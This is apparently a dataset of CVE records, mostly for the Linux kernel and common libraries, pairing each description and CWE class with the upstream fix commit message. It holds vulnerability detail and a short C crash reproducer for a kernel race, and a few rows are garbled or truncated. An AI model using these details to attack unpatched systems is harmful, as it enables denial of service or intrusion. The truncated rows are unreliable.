CVE-2018-17942,CWE-787,2018-10-03,The convert_to_decimal function in vasnprintf.c in Gnulib before 2018-09-23 has a heap-based buffer overflow because memory is not allocated for a trailing '\0' character during %f processing.,Reported by Ben Pfaff <blp@cs.stanford.edu> in <https://lists.gnu.org/archive/html/bug-gnulib/2018-09/msg00107.html>.  * lib/vasnprintf.c (convert_to_decimal): Allocate one more byte of memory. * tests/test-vasnprintf.c (test_function): Add another test.
CVE-2017-15994,CWE-354,2017-10-29,"rsync 3.1.3-development before 2017-10-24 mishandles archaic checksums, which makes it easier for remote attackers to bypass intended access restrictions. NOTE: the rsync development branch has significant use beyond the rsync developers, e.g., the code has been copied for use in various GitHub projects.",
CVE-2016-4579,CWE-20,2016-06-13,"Libksba before 1.3.4 allows remote attackers to cause a denial of service (out-of-bounds read and crash) via unspecified vectors, related to the ""returned length of the object from _ksba_ber_parse_tl.""",
CVE-2015-1593,CWE-264,2015-03-16,"The stack randomization feature in the Linux kernel before 3.19.1 on 64-bit platforms uses incorrect data types for the results of bitwise left-shift operations, which makes it easier for attackers to bypass the ASLR protection mechanism by predicting the address of the top of the stack, related to the randomize_stack_top function in fs/binfmt_elf.c and the stack_maxrandom_size function in arch/x86/mm/mmap.c.","The issue is that the stack for processes is not properly randomized on 64 bit architectures due to an integer overflow.  The affected function is randomize_stack_top() in file ""fs/binfmt_elf.c"":    static unsigned long randomize_stack_top(unsigned long stack_top)   {            unsigned int random_variable = 0;             if ((current->flags & PF_RANDOMIZE) &&                    !(current->personality & ADDR_NO_RANDOMIZE)) {                    random_variable = get_random_int() & STACK_RND_MASK;                    random_variable <<= PAGE_SHIFT;            }            return PAGE_ALIGN(stack_top) + random_variable;            return PAGE_ALIGN(stack_top) - random_variable;   }  Note that, it declares the ""random_variable"" variable as ""unsigned int"". Since the result of the shifting operation between STACK_RND_MASK (which is 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64):  	  random_variable <<= PAGE_SHIFT;  then the two leftmost bits are dropped when storing the result in the ""random_variable"". This variable shall be at least 34 bits long to hold the (22+12) result.  These two dropped bits have an impact on the entropy of process stack. Concretely, the total stack entropy is reduced by four: from 2^28 to 2^30 (One fourth of expected entropy).  This patch restores back the entropy by correcting the types involved in the operations in the functions randomize_stack_top() and stack_maxrandom_size().  The successful fix can be tested with:    $ for i in `seq 1 10`; do cat /proc/self/maps | grep stack; done   7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0                          [stack]   7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0                          [stack]   7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0                          [stack]   7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0                          [stack]   ...  Once corrected, the leading bytes should be between 7ffc and 7fff, rather than always being 7fff.  Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es> Signed-off-by: Ismael Ripoll <iripoll@upv.es> [ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ] Signed-off-by: Kees Cook <keescook@chromium.org> Cc: <stable@vger.kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Fixes: CVE-2015-1593 Link: http://lkml.kernel.org/r/20150214173350.GA18393@www.outflux.net Signed-off-by: Borislav Petkov <bp@suse.de>"
CVE-2018-16510,CWE-119,2018-09-05,"An issue was discovered in Artifex Ghostscript before 9.24. Incorrect exec stack handling in the ""CS"" and ""SC"" PDF primitives could be used by remote attackers able to supply crafted PDFs to crash the interpreter or possibly have unspecified other impact.",
CVE-2017-12190,CWE-400,2017-11-22,"The bio_map_user_iov and bio_unmap_user functions in block/bio.c in the Linux kernel before 4.13.8 do unbalanced refcounting when a SCSI I/O vector has small consecutive buffers belonging to the same page. The bio_add_pc_page function merges them into one, but the page reference is never dropped. This causes a memory leak and possible system lockup (exploitable against the host OS by a guest OS user, if a SCSI disk is passed through to a virtual machine) due to an out-of-memory condition.","bio_map_user_iov and bio_unmap_user do unbalanced pages refcounting if IO vector has small consecutive buffers belonging to the same page. bio_add_pc_page merges them into one, but the page reference is never dropped.  Cc: stable@vger.kernel.org Signed-off-by: Vitaly Mayatskikh <v.mayatskih@gmail.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2011-4112,,2012-05-17,"The net subsystem in the Linux kernel before 3.1 does not properly restrict use of the IFF_TX_SKB_SHARING flag, which allows local users to cause a denial of service (panic) by leveraging the CAP_NET_ADMIN capability to access /proc/net/pktgen/pgctrl, and then using the pktgen package in conjunction with a bridge device for a VLAN interface.","After the last patch, We are left in a state in which only drivers calling ether_setup have IFF_TX_SKB_SHARING set (we assume that drivers touching real hardware call ether_setup for their net_devices and don't hold any state in their skbs.  There are a handful of drivers that violate this assumption of course, and need to be fixed up.  This patch identifies those drivers, and marks them as not being able to support the safe transmission of skbs by clearning the IFF_TX_SKB_SHARING flag in priv_flags  Signed-off-by: Neil Horman <nhorman@tuxdriver.com> CC: Karsten Keil <isdn@linux-pingi.de> CC: ""David S. Miller"" <davem@davemloft.net> CC: Jay Vosburgh <fubar@us.ibm.com> CC: Andy Gospodarek <andy@greyhouse.net> CC: Patrick McHardy <kaber@trash.net> CC: Krzysztof Halasa <khc@pm.waw.pl> CC: ""John W. Linville"" <linville@tuxdriver.com> CC: Greg Kroah-Hartman <gregkh@suse.de> CC: Marcel Holtmann <marcel@holtmann.org> CC: Johannes Berg <johannes@sipsolutions.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-11378,CWE-119,2018-05-22,The wasm_dis() function in libr/asm/arch/wasm/wasm.c in or possibly have unspecified other impact via a crafted WASM file.,
CVE-2014-0237,CWE-399,2014-06-01,The cdf_unpack_summary_info function in cdf.c in the Fileinfo component in PHP before 5.4.29 and 5.5.x before 5.5.13 allows remote attackers to cause a denial of service (performance degradation) by triggering many file_printf calls.,
CVE-2013-4513,CWE-119,2013-11-12,Buffer overflow in the oz_cdev_write function in drivers/staging/ozwpan/ozcdev.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted write operation.,"We need to check ""count"" so we don't overflow the ei->data buffer.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-15274,CWE-476,2017-10-12,"security/keys/keyctl.c in the Linux kernel before 4.11.5 does not consider the case of a NULL payload in conjunction with a nonzero length value, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) via a crafted add_key or keyctl system call, a different vulnerability than CVE-2017-12192.","sys_add_key() and the KEYCTL_UPDATE operation of sys_keyctl() allowed a NULL payload with nonzero length to be passed to the key type's ->preparse(), ->instantiate(), and/or ->update() methods.  Various key types including asymmetric, cifs.idmap, cifs.spnego, and pkcs7_test did not handle this case, allowing an unprivileged user to trivially cause a NULL pointer dereference (kernel oops) if one of these key types was present.  Fix it by doing the copy_from_user() when 'plen' is nonzero rather than when '_payload' is non-NULL, causing the syscall to fail with EFAULT as expected when an invalid buffer is specified.  Cc: stable@vger.kernel.org # 2.6.10+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2015-7510,CWE-119,2017-09-25,Stack-based buffer overflow in the getpwnam and getgrnam functions of the NSS module nss-mymachines in systemd.,systemd#2002
CVE-2013-2128,CWE-400,2013-06-07,"The tcp_read_sock function in net/ipv4/tcp.c in the Linux kernel before 2.6.34 does not properly manage skb consumption, which allows local users to cause a denial of service (system crash) via a crafted splice system call for a TCP socket.",tcp_read_sock() can have a eat skbs without immediately advancing copied_seq. This can cause a panic in tcp_collapse() if it is called as a result of the recv_actor dropping the socket lock.  A userspace program that splices data from a socket to either another socket or to a file can trigger this bug.  Signed-off-by: Steven J. Magnani <steve@digidescorp.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2013-4299,CWE-200,2013-10-24,Interpretation conflict in drivers/md/dm-snap-persistent.c in the Linux kernel through 3.11.6 allows remote authenticated users to obtain sensitive information or modify data via a crafted mapping to a snapshot block device.,"This patch fixes a particular type of data corruption that has been encountered when loading a snapshot's metadata from disk.  When we allocate a new chunk in persistent_prepare, we increment ps->next_free and we make sure that it doesn't point to a metadata area by further incrementing it if necessary.  When we load metadata from disk on device activation, ps->next_free is positioned after the last used data chunk. However, if this last used data chunk is followed by a metadata area, ps->next_free is positioned erroneously to the metadata area. A newly-allocated chunk is placed at the same location as the metadata area, resulting in data or metadata corruption.  This patch changes the code so that ps->next_free skips the metadata area when metadata are loaded in function read_exceptions.  The patch also moves a piece of code from persistent_prepare_exception to a separate function skip_metadata to avoid code duplication.  CVE-2013-4299  Signed-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Cc: Mike Snitzer <snitzer@redhat.com> Signed-off-by: Alasdair G Kergon <agk@redhat.com>"
CVE-2014-1737,CWE-754,2014-05-11,"The raw_cmd_copyin function in drivers/block/floppy.c in the Linux kernel through 3.14.3 does not properly handle error conditions during processing of an FDRAWCMD ioctl call, which allows local users to trigger kfree operations and gain privileges by leveraging write access to a /dev/fd device.",Always clear out these floppy_raw_cmd struct members after copying the entire structure from userspace so that the in-kernel version is always valid and never left in an interdeterminate state.  Signed-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2016-9391,,2017-03-23,The jpc_bitstream_getbits function in jpc_bs.c in JasPer before 2.0.10 allows remote attackers to cause a denial of service (assertion failure) via a very large integer.,
CVE-2018-16643,CWE-252,2018-09-06,"The functions ReadDCMImage in coders/dcm.c, ReadPWPImage in coders/pwp.c, ReadCALSImage in coders/cals.c, and ReadPICTImage in coders/pict.c in ImageMagick 7.0.8-4 do not check the return value of the fputc function, which allows remote attackers to cause a denial of service via a crafted image file.",
CVE-2010-3431,,2011-01-24,"The privilege-dropping implementation in the (1) pam_env and (2) pam_mail modules in Linux-PAM (aka pam) 1.1.2 does not check the return value of the setfsuid system call, which might allow local users to obtain sensitive information by leveraging an unintended uid, as demonstrated by a symlink attack on the .pam_environment file in a user's home directory.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2010-3435.",
CVE-2011-4621,CWE-835,2012-05-17,"The Linux kernel before 2.6.37 does not properly implement a certain clock-update optimization, which allows local users to cause a denial of service (system hang) via an application that executes code in a loop.","idle_balance() drops/retakes rq->lock, leaving the previous task vulnerable to set_tsk_need_resched().  Clear it after we return from balancing instead, and in setup_thread_stack() as well, so no successfully descheduled or never scheduled task has it set.  Need resched confused the skip_clock_update logic, which assumes that the next call to update_rq_clock() will come nearly immediately after being set.  Make the optimization robust against the waking a sleeper before it sucessfully deschedules case by checking that the current task has not been dequeued before setting the flag, since it is that useless clock update we're trying to save, and clear unconditionally in schedule() proper instead of conditionally in put_prev_task().  Signed-off-by: Mike Galbraith <efault@gmx.de> Reported-by: Bjoern B. Brandenburg <bbb.lst@gmail.com> Tested-by: Yong Zhang <yong.zhang0@gmail.com> Signed-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: stable@kernel.org LKML-Reference: <1291802742.1417.9.camel@marge.simson.net> Signed-off-by: Ingo Molnar <mingo@elte.hu>"
CVE-2018-1000041,,2018-02-09,GNOME librsvg version before commit c6ddf2ed4d768fd88adbea2b63f575cd523022ea contains a Improper input validation vulnerability in rsvg-io.c that can result in the victim's Windows username and NTLM password hash being leaked to remote attackers through SMB. This attack appear to be exploitable via The victim must process a specially crafted SVG file containing an UNC path on Windows.,
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9793,CWE-119,2016-12-28,"The sock_setsockopt function in net/core/sock.c in the Linux kernel before 4.8.14 mishandles negative values of sk_sndbuf and sk_rcvbuf, which allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability for a crafted setsockopt system call with the (1) SO_SNDBUFFORCE or (2) SO_RCVBUFFORCE option.","CAP_NET_ADMIN users should not be allowed to set negative sk_sndbuf or sk_rcvbuf values, as it can lead to various memory corruptions, crashes, OOM...  Note that before commit 8298193 (""net: cleanups in sock_setsockopt()""), the bug was even more serious, since SO_SNDBUF and SO_RCVBUF were vulnerable.  This needs to be backported to all known linux kernels.  Again, many thanks to syzkaller team for discovering this gem.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-7308,CWE-189,2019-02-01,"kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.","While 979d63d (""bpf: prevent out of bounds speculation on pointer arithmetic"") took care of rejecting alu op on pointer when e.g. pointer came from two different map values with different map properties such as value size, Jann reported that a case was not covered yet when a given alu op is used in both ""ptr_reg += reg"" and ""numeric_reg += reg"" from different branches where we would incorrectly try to sanitize based on the pointer's limit. Catch this corner case and reject the program instead.  Fixes: 979d63d (""bpf: prevent out of bounds speculation on pointer arithmetic"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net> Acked-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Alexei Starovoitov <ast@kernel.org>"
CVE-2011-2183,CWE-362,2012-06-13,"Race condition in the scan_get_next_rmap_item function in mm/ksm.c in the Linux kernel before 2.6.39.3, when Kernel SamePage Merging (KSM) is enabled, allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via a crafted application.","Andrea Righi reported a case where an exiting task can race against ksmd::scan_get_next_rmap_item (http://lkml.org/lkml/2011/6/1/742) easily triggering a NULL pointer dereference in ksmd.  ksm_scan.mm_slot == &ksm_mm_head with only one registered mm  CPU 1 (__ksm_exit)		CPU 2 (scan_get_next_rmap_item)  				list_empty() is false lock				slot == &ksm_mm_head list_del(slot->mm_list) (list now empty) unlock 				lock 				slot = list_entry(slot->mm_list.next) 				(list is empty, so slot is still ksm_mm_head) 				unlock 				slot->mm == NULL ... Oops  Close this race by revalidating that the new slot is not simply the list head again.  Andrea's test case:  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/mman.h>  #define BUFSIZE getpagesize()  int main(int argc, char **argv) { 	void *ptr;  	if (posix_memalign(&ptr, getpagesize(), BUFSIZE) < 0) { 		perror(""posix_memalign""); 		exit(1); 	} 	if (madvise(ptr, BUFSIZE, MADV_MERGEABLE) < 0) { 		perror(""madvise""); 		exit(1); 	} 	*(char *)NULL = 0;  	return 0; }  Reported-by: Andrea Righi <andrea@betterlinux.com> Tested-by: Andrea Righi <andrea@betterlinux.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Signed-off-by: Hugh Dickins <hughd@google.com> Signed-off-by: Chris Wright <chrisw@sous-sol.org> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-8784,CWE-787,2016-04-13,"The NeXTDecode function in tif_next.c in LibTIFF allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted TIFF image, as demonstrated by libtiff5.tif.",triggered by http://lcamtuf.coredump.cx/afl/vulns/libtiff5.tif (bugzilla #2508)
CVE-2012-0058,CWE-400,2012-05-17,The kiocb_batch_free function in fs/aio.c in the Linux kernel before 3.2.2 allows local users to cause a denial of service (OOPS) via vectors that trigger incorrect iocb management.,"commit 69e4747 upstream.  Since commit 080d676 (""aio: allocate kiocbs in batches"") iocbs are allocated in a batch during processing of first iocbs.  All iocbs in a batch are automatically added to ctx->active_reqs list and accounted in ctx->reqs_active.  If one (not the last one) of iocbs submitted by an user fails, further iocbs are not processed, but they are still present in ctx->active_reqs and accounted in ctx->reqs_active.  This causes process to stuck in a D state in wait_for_all_aios() on exit since ctx->reqs_active will never go down to zero.  Furthermore since kiocb_batch_free() frees iocb without removing it from active_reqs list the list become corrupted which may cause oops.  Fix this by removing iocb from ctx->active_reqs and updating ctx->reqs_active in kiocb_batch_free().  Signed-off-by: Gleb Natapov <gleb@redhat.com> Reviewed-by: Jeff Moyer <jmoyer@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2017-2584,CWE-200,2017-01-15,"arch/x86/kvm/emulate.c in the Linux kernel through 4.9.3 allows local users to obtain sensitive information from kernel memory or cause a denial of service (use-after-free) via a crafted application that leverages instruction emulation for fxrstor, fxsave, sgdt, and sidt.","Introduces segemented_write_std.  Switches from emulated reads/writes to standard read/writes in fxsave, fxrstor, sgdt, and sidt.  This fixes CVE-2017-2584, a longstanding kernel memory leak.  Since commit 283c95d (""KVM: x86: emulate FXSAVE and FXRSTOR"", 2016-11-09), which is luckily not yet in any final release, this would also be an exploitable kernel memory *write*!  Reported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: 9605157 Fixes: 283c95d Suggested-by: Paolo Bonzini <pbonzini@redhat.com> Signed-off-by: Steve Rutherford <srutherford@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2015-0206,CWE-119,2015-01-09,"Memory leak in the dtls1_buffer_record function in d1_pkt.c in OpenSSL 1.0.0 before 1.0.0p and 1.0.1 before 1.0.1k allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate records for the next epoch, leading to failure of replay detection.","ssl3_setup_buffers or pqueue_insert fail. The former will fail if there is a malloc failure, whilst the latter will fail if attempting to add a duplicate record to the queue. This should never happen because duplicate records should be detected and dropped before any attempt to add them to the queue. Unfortunately records that arrive that are for the next epoch are not being recorded correctly, and therefore replays are not being detected. Additionally, these ""should not happen"" failures that can occur in dtls1_buffer_record are not being treated as fatal and therefore an attacker could exploit this by sending repeated replay records for the next epoch, eventually causing a DoS through memory exhaustion.  Thanks to Chris Mueller for reporting this issue and providing initial analysis and a patch. Further analysis and the final patch was performed by Matt Caswell from the OpenSSL development team.  CVE-2015-0206  Reviewed-by: Dr Stephen Henson <steve@openssl.org>"
CVE-2017-17439,CWE-476,2017-12-06,"In Heimdal through 7.4, remote unauthenticated attackers are able to crash the KDC by sending a crafted UDP packet containing empty data fields for client name or realm. The parser would unconditionally dereference NULL pointers in that case, leading to a segmentation fault. This is related to the _kdc_as_rep function in kdc/kerberos5.c and the der_length_visible_string function in lib/asn1/der_length.c.",This can happen in the error path when processing malformed AS requests with a NULL client name.  Bug originally introduced on Fri Feb 13 09:26:01 2015 +0100 in commit:      a873e21      kdc: base _kdc_fast_mk_error() on krb5_mk_error_ext()  Original patch by Jeffrey Altman <jaltman@secure-endpoints.com>
CVE-2014-9888,CWE-264,2016-08-06,"arch/arm/mm/dma-mapping.c in the Linux kernel before 3.13 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not prevent executable DMA mappings, which might allow local users to gain privileges via a crafted application, aka Android internal bug 28803642 and Qualcomm internal bug CR642735.","DMA mapping permissions were being derived from pgprot_kernel directly without using PAGE_KERNEL.  This causes them to be marked with executable permission, which is not what we want.  Fix this.  Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2018-15855,CWE-476,2018-08-25,"Unchecked NULL pointer usage in xkbcommon before 0.8.1 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file, because the XkbFile for an xkb_geometry section was mishandled.","xkb_geometry sections are ignored; previously the had done so by returning NULL for the section's XkbFile, however some sections of the code do not expect this. Instead, create an XkbFile for it, it will never be processes and discarded later.  Caught with the afl fuzzer.  Signed-off-by: Ran Benita <ran234@gmail.com>"
CVE-2017-7273,,2017-03-27,The cp_report_fixup function in drivers/hid/hid-cypress.c in the Linux kernel 3.2 and 4.x before 4.9.4 allows physically proximate attackers to cause a denial of service (integer underflow) or possibly have unspecified other impact via a crafted HID report.,Make sure we have enough of a report structure to validate before looking at it.  Reported-by: Benoit Camredon <benoit.camredon@airbus.com> Tested-by: Benoit Camredon <benoit.camredon@airbus.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>
CVE-2015-3195,CWE-200,2015-12-06,"The ASN1_TFLG_COMBINE implementation in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zh, 1.0.0 before 1.0.0t, 1.0.1 before 1.0.1q, and 1.0.2 before 1.0.2e mishandles errors caused by malformed X509_ATTRIBUTE data, which allows remote attackers to obtain sensitive information from process memory by triggering a decoding failure in a PKCS#7 or CMS application.",
CVE-2014-4503,CWE-20,2014-07-23,"The parse_notify function in util.c in sgminer before 4.2.2 and cgminer 3.3.0 through 4.0.1 allows man-in-the-middle attackers to cause a denial of service (application exit) via a crafted (1) bbversion, (2) prev_hash, (3) nbit, or (4) ntime parameter in a mining.notify action stratum message.","Might have introduced a memory leak, don't have time to check. :(  Should the other hex2bin()'s be checked?  Thanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this."
CVE-2011-4131,CWE-189,2012-05-17,"The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
CVE-2015-5330,CWE-200,2015-12-29,"ldb before 1.1.24, as used in the AD LDAP server in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, mishandles string lengths, which allows remote attackers to obtain sensitive information from daemon heap memory by sending crafted packets and then reading (1) an error message or (2) a database value.",
CVE-2015-7509,CWE-20,2015-12-28,"fs/ext4/namei.c in the Linux kernel before 3.7 allows physically proximate attackers to cause a denial of service (system crash) via a crafted no-journal filesystem, a related issue to CVE-2013-2015.","Instead of checking whether the handle is valid, we check if journal is enabled. This avoids taking the s_orphan_lock mutex in all cases when there is no journal in use, including the error paths where ext4_orphan_del() is called with a handle set to NULL.  Signed-off-by: Anatol Pomozov <anatol.pomozov@gmail.com> Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu>"
CVE-2013-1416,CWE-476,2013-04-19,"The prep_reprocess_req function in do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.5 does not properly perform service-principal realm referral, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted TGS-REQ request.","By sending an unusual but valid TGS-REQ, an authenticated remote attacker can cause the KDC process to crash by dereferencing a null pointer.  prep_reprocess_req() can cause a null pointer dereference when processing a service principal name.  Code in this function can inappropriately pass a null pointer to strlcpy().  Unmodified client software can trivially trigger this vulnerability, but the attacker must have already authenticated and received a valid Kerberos ticket.  The vulnerable code was introduced by the implementation of new service principal realm referral functionality in krb5-1.7, but was corrected as a side effect of the KDC refactoring in krb5-1.11.  CVSSv2 vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:H/RL:O/RC:C  ticket: 7600 (new) version_fixed: 1.10.5 status: resolved"
CVE-2017-9098,CWE-908,2017-05-19,"ImageMagick before 7.0.5-2 and GraphicsMagick before 1.3.24 use uninitialized memory in the RLE decoder, allowing an attacker to leak sensitive information from process memory space, as demonstrated by remote attacks against ImageMagick code in a long-running server process that converts image data on behalf of multiple users. This is caused by a missing initialization step in the ReadRLEImage function in coders/rle.c.",
CVE-2019-7395,CWE-401,2019-02-05,"In ImageMagick before 7.0.8-25, a memory leak exists in WritePSDChannel in coders/psd.c.",
CVE-2014-8116,CWE-399,2014-12-17,The ELF parser (readelf.c) in file before 5.21 allows remote attackers to cause a denial of service (CPU consumption or crash) via a large number of (1) program or (2) section headers or (3) invalid capabilities.,"  processed to avoid excessive processing time. - if a bad note is found, return 0 to stop processing immediately."
CVE-2016-10051,CWE-416,2017-03-23,Use-after-free vulnerability in the ReadPWPImage function in coders/pwp.c in ImageMagick 6.9.5-5 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2016-10190,CWE-119,2017-02-09,"Heap-based buffer overflow in libavformat/http.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote web servers to execute arbitrary code via a negative chunk size in an HTTP response.","Fixes #5992, reported and found by Paul Cher <paulcher@icloud.com>."
CVE-2019-11487,CWE-416,2019-04-23,"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs/fuse/dev.c, fs/pipe.c, fs/splice.c, include/linux/mm.h, include/linux/pipe_fs_i.h, kernel/trace/trace.c, mm/gup.c, and mm/hugetlb.c. It can occur with FUSE requests.",Change pipe_buf_get() to return a bool indicating whether it succeeded in raising the refcount of the page (if the thing in the pipe is a page). This removes another mechanism for overflowing the page refcount.  All callers converted to handle a failure.  Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Matthew Wilcox <willy@infradead.org> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2010-5332,CWE-119,2019-07-27,"In the Linux kernel before 2.6.37, an out of bounds array access happened in drivers/net/mlx4/port.c. When searching for a free entry in either mlx4_register_vlan() or mlx4_register_mac(), and there is no free entry, the loop terminates without updating the local variable free thus causing out of array bounds access.","When searching for a free entry in either mlx4_register_vlan() or mlx4_register_mac(), and there is no free entry, the loop terminates without updating the local variable free thus causing out of array bounds access. Fix this by adding a proper check outside the loop.  Signed-off-by: Eli Cohen <eli@mellanox.co.il> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-6491,CWE-125,2016-12-13,"Buffer overflow in the Get8BIMProperty function in MagickCore/property.c in ImageMagick before 6.9.5-4 and 7.x before 7.0.2-6 allows remote attackers to cause a denial of service (out-of-bounds read, memory leak, and crash) via a crafted image.",
CVE-2017-2583,,2017-02-06,"The load_segment_descriptor implementation in arch/x86/kvm/emulate.c in the Linux kernel before 4.9.5 improperly emulates a ""MOV SS, NULL selector"" instruction, which allows guest OS users to cause a denial of service (guest OS crash) or gain guest OS privileges via a crafted application.","This is CVE-2017-2583.  On Intel this causes a failed vmentry because SS's type is neither 3 nor 7 (even though the manual says this check is only done for usable SS, and the dmesg splat says that SS is unusable!). On AMD it's worse: svm.c is confused and sets CPL to 0 in the vmcb.  The fix fabricates a data segment descriptor when SS is set to a null selector, so that CPL and SS.DPL are set correctly in the VMCS/vmcb. Furthermore, only allow setting SS to a NULL selector if SS.RPL < 3; this in turn ensures CPL < 3 because RPL must be equal to CPL.  Thanks to Andy Lutomirski and Willy Tarreau for help in analyzing the bug and deciphering the manuals.  Reported-by: Xiaohan Zhang <zhangxiaohan1@huawei.com> Fixes: 79d5b4c Cc: stable@nongnu.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-2182,CWE-264,2014-06-13,"The Mandril security plugin in Monkey HTTP Daemon (monkeyd) before 1.5.0 allows remote attackers to bypass access restrictions via a crafted URI, as demonstrated by an encoded forward slash.",Signed-off-by: Eduardo Silva <eduardo@monkey.io>
CVE-2014-9644,CWE-269,2015-03-02,"The Crypto API in the Linux kernel before 3.18.5 allows local users to load arbitrary kernel modules via a bind system call for an AF_ALG socket with a parenthesized module template expression in the salg_name field, as demonstrated by the vfat(aes) expression, a different vulnerability than CVE-2013-7421.","This adds the module loading prefix ""crypto-"" to the template lookup as well.  For example, attempting to load 'vfat(blowfish)' via AF_ALG now correctly includes the ""crypto-"" prefix at every level, correctly rejecting ""vfat"":  	net-pf-38 	algif-hash 	crypto-vfat(blowfish) 	crypto-vfat(blowfish)-all 	crypto-vfat  Reported-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Kees Cook <keescook@chromium.org> Acked-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
